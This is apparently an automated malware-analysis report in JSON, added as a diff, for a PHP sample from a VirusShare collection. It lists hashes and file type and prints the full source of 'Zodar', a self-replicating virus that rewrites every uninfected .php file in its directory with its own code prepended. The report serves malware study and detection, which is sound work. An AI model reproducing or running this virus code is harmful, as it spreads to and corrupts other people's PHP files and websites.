@@ -1,0 +1,59 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "<?php\nfunction zodar()\n{\n//[Zodar] by Negral\n//Created 03/05/2002\n$c = \"\";\n$f = fopen (__FILE__, \"r\");\n$c = fread ($f, filesize (__FILE__));\nfclose ($f);\n$c = substr($c,0,866);\n$handle=opendir('.');\nwhile (($file = readdir($handle))!==false) {\nif ($file != \".\" && $file != \"..\") \n {\n$s = substr($file, -3);\nif ($s==\"php\") \n   {\n\t$g = fopen ($file, \"r\"); \n\t$cont = fread ($g,filesize ($file));      \n\tfclose ($g);\n\tif (!strstr($cont,\"[Zodar]\"))\n\t{\n\tunlink(\"$file\");\n\t$g = fopen ($file, \"a+\"); \n\tfwrite ($g,\"$c\");      \t\n\tfwrite ($g,\"\\n\");\n\tfwrite ($g,substr($cont,5));\n\tfclose ($g);\n\t}\n   }\n\n }\n\n}\n\nclosedir($handle); \n}\nzodar();\n?>"
+    },
+    "filename": "VirusShare_15a03ccf68fcd47ad835e20a7c2255ce",
+    "filesize": 669,
+    "filetype": "PHP script, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "15a03ccf68fcd47ad835e20a7c2255ce",
+        "sha1": "2f5770a7cca4798d4691bf7a4173c7dcb9007c03",
+        "sha256": "f71bf0ab59a9766f77be65f02905d59272d5f36dac69e77bc844fd0d7eb206f3"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<?php",
+            "function zodar()",
+            "//[Zodar] by Negral",
+            "//Created 03/05/2002",
+            "$c = \"\";",
+            "$f = fopen (__FILE__, \"r\");",
+            "$c = fread ($f, filesize (__FILE__));",
+            "fclose ($f);",
+            "$c = substr($c,0,866);",
+            "$handle=opendir('.');",
+            "while (($file = readdir($handle))!==false) {",
+            "if ($file != \".\" && $file != \"..\") ",
+            "$s = substr($file, -3);",
+            "if ($s==\"php\") ",
+            "   {",
+            "\t$g = fopen ($file, \"r\"); ",
+            "\t$cont = fread ($g,filesize ($file));      ",
+            "\tfclose ($g);",
+            "\tif (!strstr($cont,\"[Zodar]\"))",
+            "\tunlink(\"$file\");",
+            "\t$g = fopen ($file, \"a+\"); ",
+            "\tfwrite ($g,\"$c\");      \t",
+            "\tfwrite ($g,\"\\n\");",
+            "\tfwrite ($g,substr($cont,5));",
+            "\tfclose ($g);",
+            "   }",
+            "closedir($handle); ",
+            "zodar();"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.277793",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
